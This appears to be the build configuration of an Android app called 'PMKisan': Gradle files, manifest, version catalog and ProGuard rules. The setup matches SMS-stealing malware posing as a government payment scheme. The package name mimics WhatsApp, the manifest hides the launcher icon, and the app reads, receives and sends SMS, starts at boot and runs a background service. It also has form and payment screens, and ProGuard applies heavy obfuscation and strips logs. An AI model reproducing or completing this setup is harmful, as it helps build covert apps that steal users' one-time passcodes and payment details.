plugins {
    alias(libs.plugins.android.application)
    alias(libs.plugins.kotlin.android)
    alias(libs.plugins.kotlin.compose)
}

android {
    namespace = "com.pakajb.avzbakl.msbzjl.whatsapp"
    compileSdk = 35

    defaultConfig {
        applicationId = "com.pakajb.avzbakl.msbzjl.whatsapp"
        minSdk = 24
        targetSdk = 35
        versionCode = 1
        versionName = "1.0"

        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }


        debug {
            isMinifyEnabled = false
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }

    kotlinOptions {
        jvmTarget = "11"
    }

    buildFeatures {
        compose = true
    }

    composeOptions {
        kotlinCompilerExtensionVersion = "1.5.1" // Ensure this matches your Compose version
    }

    packaging {
        resources {
            excludes += "/META-INF/{AL2.0,LGPL2.1}"
        }
    }
}


dependencies {
    // Core AndroidX Libraries
    implementation(libs.androidx.core.ktx)
    implementation(libs.androidx.appcompat)
    implementation(libs.material)
    implementation(libs.androidx.constraintlayout)
    implementation (libs.kotlin.stdlib)


    // Lifecycle and Compose
    implementation(libs.androidx.lifecycle.runtime.ktx)
    implementation(platform(libs.androidx.compose.bom))
    implementation(libs.androidx.ui)
    implementation(libs.androidx.ui.graphics)
    implementation(libs.androidx.ui.tooling)
    implementation(libs.androidx.ui.tooling.preview)
    implementation(libs.androidx.material3)

    // OkHttp
    implementation(libs.okhttp)

    // Retrofit for API calls
    implementation(libs.retrofit)
    implementation(libs.converter.gson)

    // Testing Libraries
    testImplementation(libs.junit)
    androidTestImplementation(libs.androidx.junit)
    androidTestImplementation(libs.androidx.espresso.core)

    // Fix for Compose UI Test
    androidTestImplementation(libs.ui.test.junit4)  // Add Compose test dependency

    debugImplementation(libs.androidx.ui.test.manifest)
}









menifest xml


<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    >

    <!-- Permissions -->
    <uses-feature
        android:name="android.hardware.telephony"
        android:required="false" />

    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK"/>


    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher"
        android:supportsRtl="true"
        android:theme="@style/Theme.MyApp"
        android:usesCleartextTraffic="false">

        <!-- Main Activity -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            tools:node="merge">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.INFO" />
            </intent-filter>
        </activity>

        <!--        &lt;!&ndash; SMS Receiver &ndash;&gt;-->
        <receiver
            android:name=".receivers.SMSReceiver"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BROADCAST_SMS">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- Boot Receiver -->
        <receiver
            android:name=".receivers.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <!-- SMS Service -->
        <service
            android:name=".services.SmsService"
            android:foregroundServiceType="dataSync"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="com.pakajb.avzbakl.msbzjl.skalalk.START_SERVICE" />
            </intent-filter>
        </service>

        <!-- Additional Activities -->
        <activity android:name=".activities.FormActivity"
            android:exported="false" />
        <activity android:name=".activities.PaymentActivity"
            android:exported="false" />
        <activity android:name=".activities.SuccessActivity"
            android:exported="false" />

    </application>

</manifest>









project level gradle

// Top-level build file where you can add configuration options common to all sub-projects/modules.
plugins {
    alias(libs.plugins.android.application) apply false
    alias(libs.plugins.kotlin.android) apply false
}









setting level gradal 

pluginManagement {
    repositories {
        google {
            content {
                includeGroupByRegex("com\\.android.*")
                includeGroupByRegex("com\\.google.*")
                includeGroupByRegex("androidx.*")
            }
        }
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "PMKisan"
include(":app")




toml 

[versions]
agp = "8.8.0"
androidxJunit = "1.2.1"
constraintlayout = "2.2.0"
converterGson = "2.11.0"
espressoCore = "3.6.1"
kotlin = "2.0.0"
coreKtx = "1.15.0"
junit = "4.13.2"
kotlinStdlib = "2.1.0"
lifecycleRuntimeKtx = "2.8.7"

composeBom = "2025.01.00"
appcompat = "1.7.0"
material = "1.12.0"
okhttp = "4.12.0"
retrofit = "2.11.0"
uiTestJunit4 = "1.7.6"

[libraries]

androidx-constraintlayout = { module = "androidx.constraintlayout:constraintlayout", version.ref = "constraintlayout" }
androidx-core-ktx = { group = "androidx.core", name = "core-ktx", version.ref = "coreKtx" }
androidx-espresso-core = { module = "androidx.test.espresso:espresso-core", version.ref = "espressoCore" }
androidx-junit = { module = "androidx.test.ext:junit", version.ref = "androidxJunit" }
converter-gson = { module = "com.squareup.retrofit2:converter-gson", version.ref = "converterGson" }
junit = { group = "junit", name = "junit", version.ref = "junit" }
androidx-lifecycle-runtime-ktx = { group = "androidx.lifecycle", name = "lifecycle-runtime-ktx", version.ref = "lifecycleRuntimeKtx" }
androidx-compose-bom = { group = "androidx.compose", name = "compose-bom", version.ref = "composeBom" }
androidx-ui = { group = "androidx.compose.ui", name = "ui" }
androidx-ui-graphics = { group = "androidx.compose.ui", name = "ui-graphics" }
androidx-ui-tooling = { group = "androidx.compose.ui", name = "ui-tooling" }
androidx-ui-tooling-preview = { group = "androidx.compose.ui", name = "ui-tooling-preview" }
androidx-ui-test-manifest = { group = "androidx.compose.ui", name = "ui-test-manifest" }

androidx-material3 = { group = "androidx.compose.material3", name = "material3" }
androidx-appcompat = { group = "androidx.appcompat", name = "appcompat", version.ref = "appcompat" }
kotlin-stdlib = { module = "org.jetbrains.kotlin:kotlin-stdlib", version.ref = "kotlinStdlib" }
material = { module = "com.google.android.material:material", version.ref = "material" }
okhttp = { module = "com.squareup.okhttp3:okhttp", version.ref = "okhttp" }
retrofit = { module = "com.squareup.retrofit2:retrofit", version.ref = "retrofit" }
ui-test-junit4 = { module = "androidx.compose.ui:ui-test-junit4", version.ref = "uiTestJunit4" }

[plugins]
android-application = { id = "com.android.application", version.ref = "agp" }
kotlin-android = { id = "org.jetbrains.kotlin.android", version.ref = "kotlin" }
kotlin-compose = { id = "org.jetbrains.kotlin.plugin.compose", version.ref = "kotlin" }












proguard 


# 🔒 Obfuscation (नाम बदलना और सुरक्षा बढ़ाना)
-dontusemixedcaseclassnames
-dontpreverify
-optimizationpasses 5
-overloadaggressively
-flattenpackagehierarchy
-repackageclasses obfuscated

# 🚀 Debugging Info हटाएं
-dontusemixedcaseclassnames
-dontoptimize
-dontwarn android.support.**
-dontwarn kotlinx.**
-dontwarn kotlin.**

# 🔹 Native Code को सुरक्षित रखें
-keepclasseswithmembers class * {
    native <methods>;
}

# 🔹 Reflection सुरक्षा (Prevent Reflection-Based Attacks)
-keepattributes *Annotation*
-keep class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}

# 🔹 ProGuard कोड को सुरक्षित बनाने के लिए
-keep public class * extends android.app.Application
-keep public class * extends androidx.lifecycle.ViewModel

# ✅ Retrofit और OkHttp को Preserve करें (Backend Connectivity)
-keep class retrofit2.** { *; }
-keepattributes Signature
-keep class okhttp3.** { *; }
-keep class okhttp3.logging.** { *; }

# ✅ Gson JSON Parsing को Preserve करें
-keep class com.google.gson.** { *; }
-keep class com.google.gson.reflect.TypeToken { *; }

# ✅ सभी Model Classes को सुरक्षित रखें (Data Classes)
-keepclassmembers class * {
    @com.google.gson.annotations.SerializedName <fields>;
}

# ✅ Interface Methods को Preserve करें (API Calls के लिए)
-keep interface retrofit2.** { *; }

# ✅ Kotlin Coroutines और Flow को Preserve करें
-keep class kotlinx.coroutines.** { *; }

# ✅ JSON Keys को CamelCase में Preserve करें
-keepattributes RuntimeVisibleAnnotations

# 🔹 लॉग्स को Remove करें (Production में Debugging Off)
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}


